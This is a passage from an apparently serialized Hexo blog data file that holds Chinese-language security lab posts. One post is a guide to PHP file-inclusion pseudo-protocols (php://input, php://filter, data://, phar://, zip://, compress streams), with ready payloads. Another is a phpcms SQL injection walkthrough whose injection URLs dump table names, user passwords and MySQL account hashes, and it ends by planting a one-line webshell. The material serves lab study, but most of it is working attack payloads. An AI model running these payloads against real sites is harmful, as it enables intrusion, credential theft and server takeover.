class=\"line\">//%2b是+,需要使用url编码</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/004.png\" alt=\"004\"></p>\n<h2 id=\"利用phar\"><a href=\"#利用phar\" class=\"headerlink\" title=\"利用phar\"></a>利用phar</h2><p><em>利用条件：</em></p>\n<p>1、php 版本大于等于 php5.3.0</p>\n<p>假设有个文件 phpinfo.txt，其内容为 <code>&lt;?php phpinfo(); ?&gt;</code>，打包成 zip 压缩包，如下：</p>\n<blockquote>\n<p>路径：test.zip/test/phpinfo.txt</p>\n</blockquote>\n<p><img src=\"/img/FileContains/004_1.png\" alt=\"004_1\"></p>\n<blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> <span class=\"comment\"># 相对路径</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> includes.php?file=phar://upload/test.zip/<span class=\"built_in\">test</span>/phpinfo.txt</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> </span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> <span class=\"comment\"># 绝对路径</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> includes.php?file=phar://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/test.zip/<span class=\"built_in\">test</span>/phpinfo.txt</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"></span></span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><img src=\"/img/FileContains/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/FileContains/006.png\" alt=\"006\"></p>\n<h2 id=\"利用zip-bzip2-zlib-协议\"><a href=\"#利用zip-bzip2-zlib-协议\" class=\"headerlink\" title=\"利用zip://, bzip2://, zlib://协议\"></a>利用zip://, bzip2://, zlib://协议</h2><p><em>利用条件：</em></p>\n<p>1、zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用</p>\n<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件。</p>\n<h3 id=\"zip-协议\"><a href=\"#zip-协议\" class=\"headerlink\" title=\"zip://协议\"></a>zip://协议</h3><p><strong>使用方法：</strong></p>\n<p>zip://archive.zip#dir/file.txt</p>\n<p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>\n<blockquote>\n<p>使用 zip 协议，需要指定绝对路径，同时将 <code>#</code> 编码为 <code>%23</code>，之后填上压缩包内的文件。</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 绝对路径</span></span><br><span class=\"line\">includes.php?file=zip://C:\\phpStudy\\PHPTutorial\\WWW\\upload-labs\\upload\\test.zip%23phpinfo.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 相对路径</span></span><br><span class=\"line\">includes.php?file=zip://upload/test.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/FileContains/008.png\" alt=\"008\"></p>\n<h3 id=\"bzip2-协议\"><a href=\"#bzip2-协议\" class=\"headerlink\" title=\"bzip2://协议\"></a>bzip2://协议</h3><p><strong>使用方法：</strong></p>\n<p>compress.bzip2://file.bz2</p>\n<p>利用linux压缩命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">bzip2 压缩</span></span><br><span class=\"line\">bzip2 phpinfo</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">生成phpinfo.bz2,上传到目录</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">includes</span>.php?<span class=\"keyword\">file</span>=compress.bzip2:<span class=\"comment\">//./upload/phpinfo.bz2</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/FileContains/011.png\" alt=\"011\"></p>\n<h3 id=\"zlib-协议\"><a href=\"#zlib-协议\" class=\"headerlink\" title=\"zlib://协议\"></a>zlib://协议</h3><p><strong>使用方法：</strong></p>\n<p>compress.zlib://file.gz</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 绝对路径</span></span><br><span class=\"line\">includes.php?file=compress.zlib://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/phpinfo.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 相对路径</span></span><br><span class=\"line\">includes.php?file=compress.zlib://./upload/phpinfo.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/FileContains/013.png\" alt=\"013\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"php-文件包含伪协议利用\"><a href=\"#php-文件包含伪协议利用\" class=\"headerlink\" title=\"php 文件包含伪协议利用\"></a>php 文件包含伪协议利用</h1><hr>\n<h2 id=\"重要配置\"><a href=\"#重要配置\" class=\"headerlink\" title=\"重要配置\"></a>重要配置</h2><p>PHP.ini：</p>\n<p>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</p>\n<p>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。</p>\n<h2 id=\"PHP-中的封装协议-伪协议\"><a href=\"#PHP-中的封装协议-伪协议\" class=\"headerlink\" title=\"PHP 中的封装协议(伪协议)\"></a>PHP 中的封装协议(伪协议)</h2><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//cn2.php.net/manual/zh/wrappers.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">file:</span><span class=\"comment\">///var/www/html 访问本地文件系统</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">ftp:</span><span class=\"comment\">//&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问 FTP(s) URLs</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">data:</span><span class=\"comment\">// 数据流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">// — 访问 HTTP(s) URLs</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">ftp:</span><span class=\"comment\">// — 访问 FTP(s) URLs</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">php:</span><span class=\"comment\">// — 访问各个输入/输出流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">zlib:</span><span class=\"comment\">// — 压缩流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">data:</span><span class=\"comment\">// — Data (RFC 2397)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">glob:</span><span class=\"comment\">// — 查找匹配的文件路径模式</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">phar:</span><span class=\"comment\">// — PHP Archive</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">ssh2:</span><span class=\"comment\">// — Secure Shell 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">rar:</span><span class=\"comment\">// — RAR</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">ogg:</span><span class=\"comment\">// — Audio streams</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">expect:</span><span class=\"comment\">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"利用file-协议\"><a href=\"#利用file-协议\" class=\"headerlink\" title=\"利用file://协议\"></a>利用file://协议</h2><p>利用条件：双off的情况下也可以正常使用</p>\n<p>file:// [文件的绝对路径和文件名]</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">includes.php?file=file://C:<span class=\"symbol\">\\p</span>hpStudy<span class=\"symbol\">\\P</span>HPTutorial<span class=\"symbol\">\\W</span>WW<span class=\"symbol\">\\u</span>pload-labs<span class=\"symbol\">\\u</span>pload<span class=\"symbol\">\\p</span>hpinfo.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/000.png\" alt=\"000\"></p>\n<h2 id=\"利用php流input\"><a href=\"#利用php流input\" class=\"headerlink\" title=\"利用php流input\"></a>利用php流input</h2><p><em>利用条件：</em></p>\n<p>1、allow_url_include = On。</p>\n<p>2、对 allow_url_fopen 不做要求。</p>\n<blockquote>\n<p>/includes.php?file=php://input</p>\n<p>POST：<code>&lt;?php phpinfo();?&gt;</code></p>\n</blockquote>\n<p><img src=\"/img/FileContains/001.png\" alt=\"001\"></p>\n<h2 id=\"利用php流filter\"><a href=\"#利用php流filter\" class=\"headerlink\" title=\"利用php流filter\"></a>利用php流filter</h2><p>利用条件：双off的情况下也可以正常使用</p>\n<p>通过指定末尾的文件，可以读取经 base64 加密后的文件源码。（读取敏感文件）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/convert.base64-encode/resource=includes.php</span><br><span class=\"line\">//includes.php是读取的文件</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/FileContains/003.png\" alt=\"003\"></p>\n<h2 id=\"利用-data-URIs\"><a href=\"#利用-data-URIs\" class=\"headerlink\" title=\"利用 data URIs\"></a>利用 data URIs</h2><p><em>利用条件：</em></p>\n<p>1、php 版本大于等于 php5.2</p>\n<p>2、allow_url_fopen = On</p>\n<p>3、allow_url_include = On</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class=\"line\">file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class=\"line\">//%2b是+,需要使用url编码</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/004.png\" alt=\"004\"></p>\n<h2 id=\"利用phar\"><a href=\"#利用phar\" class=\"headerlink\" title=\"利用phar\"></a>利用phar</h2><p><em>利用条件：</em></p>\n<p>1、php 版本大于等于 php5.3.0</p>\n<p>假设有个文件 phpinfo.txt，其内容为 <code>&lt;?php phpinfo(); ?&gt;</code>，打包成 zip 压缩包，如下：</p>\n<blockquote>\n<p>路径：test.zip/test/phpinfo.txt</p>\n</blockquote>\n<p><img src=\"/img/FileContains/004_1.png\" alt=\"004_1\"></p>\n<blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> <span class=\"comment\"># 相对路径</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> includes.php?file=phar://upload/test.zip/<span class=\"built_in\">test</span>/phpinfo.txt</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> </span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> <span class=\"comment\"># 绝对路径</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> includes.php?file=phar://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/test.zip/<span class=\"built_in\">test</span>/phpinfo.txt</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"></span></span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><img src=\"/img/FileContains/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/FileContains/006.png\" alt=\"006\"></p>\n<h2 id=\"利用zip-bzip2-zlib-协议\"><a href=\"#利用zip-bzip2-zlib-协议\" class=\"headerlink\" title=\"利用zip://, bzip2://, zlib://协议\"></a>利用zip://, bzip2://, zlib://协议</h2><p><em>利用条件：</em></p>\n<p>1、zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用</p>\n<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件。</p>\n<h3 id=\"zip-协议\"><a href=\"#zip-协议\" class=\"headerlink\" title=\"zip://协议\"></a>zip://协议</h3><p><strong>使用方法：</strong></p>\n<p>zip://archive.zip#dir/file.txt</p>\n<p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>\n<blockquote>\n<p>使用 zip 协议，需要指定绝对路径，同时将 <code>#</code> 编码为 <code>%23</code>，之后填上压缩包内的文件。</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 绝对路径</span></span><br><span class=\"line\">includes.php?file=zip://C:\\phpStudy\\PHPTutorial\\WWW\\upload-labs\\upload\\test.zip%23phpinfo.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 相对路径</span></span><br><span class=\"line\">includes.php?file=zip://upload/test.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/FileContains/008.png\" alt=\"008\"></p>\n<h3 id=\"bzip2-协议\"><a href=\"#bzip2-协议\" class=\"headerlink\" title=\"bzip2://协议\"></a>bzip2://协议</h3><p><strong>使用方法：</strong></p>\n<p>compress.bzip2://file.bz2</p>\n<p>利用linux压缩命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">bzip2 压缩</span></span><br><span class=\"line\">bzip2 phpinfo</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">生成phpinfo.bz2,上传到目录</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">includes</span>.php?<span class=\"keyword\">file</span>=compress.bzip2:<span class=\"comment\">//./upload/phpinfo.bz2</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/FileContains/011.png\" alt=\"011\"></p>\n<h3 id=\"zlib-协议\"><a href=\"#zlib-协议\" class=\"headerlink\" title=\"zlib://协议\"></a>zlib://协议</h3><p><strong>使用方法：</strong></p>\n<p>compress.zlib://file.gz</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 绝对路径</span></span><br><span class=\"line\">includes.php?file=compress.zlib://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/phpinfo.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 相对路径</span></span><br><span class=\"line\">includes.php?file=compress.zlib://./upload/phpinfo.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/FileContains/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/FileContains/013.png\" alt=\"013\"></p>\n"},{"title":"phpcms框架SQL注入","date":"2018-10-29T07:28:52.000Z","_content":"# phpcms框架SQL注入\n\n## 注入页面\n\n![001](/img/sql/phpcms/001.png)\n\n## 注入过程\n\n随便点击一个页面进行注入\n\n发现返回报错信息\n\n![002](/img/sql/phpcms/002.png)\n\n\n\n### 判断注入类型\n\n通过判断为数字型\n\n![003](/img/sql/phpcms/003.png)\n\n\n\n### 获取用户和当前数据库名\n\n`http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,concat(user(),0x7e,database()),0x7e))%23`\n\n![004](/img/sql/phpcms/004.png)\n\n### 获取表名\n\n`http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema='cms' limit 1,1),0x7e))%23`\n\n发现表名太多了,还是直接爆出比较犀利\n\n![005](/img/sql/phpcms/005.png)\n\n\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='cms'),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![006](/img/sql/phpcms/006.png)\n\n直接爆出会遇上编码问题，需要concert()函数转码。\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(table_name using latin1)) from information_schema.tables where table_schema='cms'),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![007](/img/sql/phpcms/007.png)\n\n### 获取列名\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(column_name using latin1)) from information_schema.columns where table_schema='cms' and table_name='cms_users'),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![009](/img/sql/phpcms/009.png)\n\n\n\n### 获取账户\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(userid,0x7e,username,0x7e,password) from cms.cms_users),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![010](/img/sql/phpcms/010.png)\n\n解密后密码为：\n\n![011](/img/sql/phpcms/011.png)\n\n同理可获取mysql数据库的账户密码\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(User,0x7e,Password) from mysql.user),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![012](/img/sql/phpcms/012.png)\n\n![013](/img/sql/phpcms/013.png)\n\n## 登录后台\n\n### 登录界面存在SQL注入和万能密码\n\n登录界面存在万能密码，闭合方式为`'\"\"'`（5.4版本）\n\n![014](/img/sql/phpcms/014.png)\n\n同样存在SQL注入\n\n![017](/img/sql/phpcms/016.png)\n\n![015](/img/sql/phpcms/015.png)\n\n\n\n### 上传文件\n\n直接上传会出现文件限制\n\n![017](/img/sql/phpcms/017.png)\n\n尝试多种方法后发现上传这条路不通。\n\n\n\n### 数据库上传\n\n![018](/img/sql/phpcms/018.png)\n\n\n\n![020](/img/sql/phpcms/020.png)\n\n上传一个phpinfo试试,成功访问\n\n![021](/img/sql/phpcms/021.png)\n\n同理再传个一句话木马,用菜刀连接\n\n![022](/img/sql/phpcms/022.png)","source":"_posts/phpcms框架SQL注入.md","raw":"---\ntitle: phpcms框架SQL注入\ndate: 2018-10-29 15:28:52\ntags: [实验]\ncategories: sql注入\n---\n# phpcms框架SQL注入\n\n## 注入页面\n\n![001](/img/sql/phpcms/001.png)\n\n## 注入过程\n\n随便点击一个页面进行注入\n\n发现返回报错信息\n\n![002](/img/sql/phpcms/002.png)\n\n\n\n### 判断注入类型\n\n通过判断为数字型\n\n![003](/img/sql/phpcms/003.png)\n\n\n\n### 获取用户和当前数据库名\n\n`http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,concat(user(),0x7e,database()),0x7e))%23`\n\n![004](/img/sql/phpcms/004.png)\n\n### 获取表名\n\n`http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema='cms' limit 1,1),0x7e))%23`\n\n发现表名太多了,还是直接爆出比较犀利\n\n![005](/img/sql/phpcms/005.png)\n\n\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='cms'),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![006](/img/sql/phpcms/006.png)\n\n直接爆出会遇上编码问题，需要concert()函数转码。\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(table_name using latin1)) from information_schema.tables where table_schema='cms'),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![007](/img/sql/phpcms/007.png)\n\n### 获取列名\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(column_name using latin1)) from information_schema.columns where table_schema='cms' and table_name='cms_users'),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![009](/img/sql/phpcms/009.png)\n\n\n\n### 获取账户\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(userid,0x7e,username,0x7e,password) from cms.cms_users),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![010](/img/sql/phpcms/010.png)\n\n解密后密码为：\n\n![011](/img/sql/phpcms/011.png)\n\n同理可获取mysql数据库的账户密码\n\n`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(User,0x7e,Password) from mysql.user),4,5,6,7,8,9,10,11,12,13,14,15%23`\n\n![012](/img/sql/phpcms/012.png)\n\n![013](/img/sql/phpcms/013.png)\n\n## 登录后台\n\n### 登录界面存在SQL注入和万能密码\n\n登录界面存在万能密码，闭合方式为`'\"\"'`（5.4版本）\n\n![014](/img/sql/phpcms/014.png)\n\n同样存在SQL注入\n\n![017](/img/sql/phpcms/016.png)\n\n![015](/img/sql/phpcms/015.png)\n\n\n\n### 上传文件\n\n直接上传会出现文件限制\n\n![017](/img/sql/phpcms/017.png)\n\n尝试多种方法后发现上传这条路不通。\n\n\n\n### 数据库上传\n\n![018](/img/sql/phpcms/018.png)\n\n\n\n![020](/img/sql/phpcms/020.png)\n\n上传一个phpinfo试试,成功访问\n\n![021](/img/sql/phpcms/021.png)\n\n同理再传个一句话木马,用菜刀连接\n\n![022](/img/sql/phpcms/022.png)","slug":"phpcms框架SQL注入","published":1,"updated":"2019-06-19T17:23:13.383Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istca001a4dsb28m7t2hk","content":"<h1 id=\"phpcms框架SQL注入\"><a href=\"#phpcms框架SQL注入\" class=\"headerlink\" title=\"phpcms框架SQL注入\"></a>phpcms框架SQL注入</h1><h2 id=\"注入页面\"><a href=\"#注入页面\" class=\"headerlink\" title=\"注入页面\"></a>注入页面</h2><p><img src=\"/img/sql/phpcms/001.png\" alt=\"001\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>随便点击一个页面进行注入</p>\n<p>发现返回报错信息</p>\n<p><img src=\"/img/sql/phpcms/002.png\" alt=\"002\"></p>\n<h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><p>通过判断为数字型</p>\n<p><img src=\"/img/sql/phpcms/003.png\" alt=\"003\"></p>\n<h3 id=\"获取用户和当前数据库名\"><a href=\"#获取用户和当前数据库名\" class=\"headerlink\" title=\"获取用户和当前数据库名\"></a>获取用户和当前数据库名</h3><p><code>http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,concat(user(),0x7e,database()),0x7e))%23</code></p>\n<p><img src=\"/img/sql/phpcms/004.png\" alt=\"004\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;cms&#39; limit 1,1),0x7e))%23</code></p>\n<p>发现表名太多了,还是直接爆出比较犀利</p>\n<p><img src=\"/img/sql/phpcms/005.png\" alt=\"005\"></p>\n<p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;cms&#39;),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/006.png\" alt=\"006\"></p>\n<p>直接爆出会遇上编码问题，需要concert()函数转码。</p>\n<p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(table_name using latin1)) from information_schema.tables where table_schema=&#39;cms&#39;),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(column_name using latin1)) from information_schema.columns where table_schema=&#39;cms&#39; and table_name=&#39;cms_users&#39;),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/009.png\" alt=\"009\"></p>\n<h3 id=\"获取账户\"><a href=\"#获取账户\" class=\"headerlink\" title=\"获取账户\"></a>获取账户</h3><p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(userid,0x7e,username,0x7e,password) from cms.cms_users),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/010.png\" alt=\"010\"></p>\n<p>解密后密码为：</p>\n<p><img src=\"/img/sql/phpcms/011.png\" alt=\"011\"></p>\n<p>同理可获取mysql数据库的账户密码</p>\n<p><code>http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(User,0x7e,Password) from mysql.user),4,5,6,7,8,9,10,11,12,13,14,15%23</code></p>\n<p><img src=\"/img/sql/phpcms/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/sql/phpcms/013.png\" alt=\"013\"></p>\n<h2 id=\"登录后台\"><a href=\"#登录后台\" class=\"headerlink\" title=\"登录后台\"></a>登录后台</h2><h3 id=\"登录界面存在SQL注入和万能密码\"><a href=\"#登录界面存在SQL注入和万能密码\" class=\"headerlink\" title=\"登录界面存在SQL注入和万能密码\"></a>登录界面存在SQL注入和万能密码</h3><p>登录界面存在万能密码，闭合方式为<code>&#39;&quot;&quot;&#39;</code>（5.4版本）</p>\n<p><img src=\"/img/sql/phpcms/014.png\" alt=\"014\"></p>\n<p>同样存在SQL注入</p>\n<p><img src=\"/img/sql/phpcms/016.png\" alt=\"017\"></p>\n<p><img src=\"/img/sql/phpcms/015.png\" alt=\"015\"></p>\n<h3 id=\"上传文件\"><a href=\"#上传文件\" class=\"headerlink\" title=\"上传文件\"></a>上传文件</h3><p>直接上传会出现文件限制</p>\n<p><img src=\"/img/sql/phpcms/017.png\" alt=\"017\"></p>\n<p>尝试多种方法后发现上传这条路不通。</p>\n<h3 id=\"数据库上传\"><a href=\"#数据库上传\" class=\"headerlink\" title=\"数据库上传\"></a>数据库上传</h3><p><img src=\"/img/sql/phpcms/018.png\" alt=\"018\"></p>\n<p><img src=\"/img/sql/phpcms/020.png\" alt=\"020\"></p>\n<p>上传一个phpinfo试试,成功访问</p>\n<p><img src=\"/img/sql/phpcms/021.png\" alt=\"021\"></p>\n<p>同理再传个一句话木马,用菜刀连接</p>\n<p><img src=\"/img/sql/phpcms/022.png\" alt=\"022\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"phpcms框架SQL注入\"><a href=\"#phpcms框架SQL注入\" class=\"headerlink\" title=\"phpcms框架SQL注入\"></a>phpcms框架SQL注入</h1><h2 id=\"注入页面\"><a href=\"#注入页面\" class=\"headerlink\" 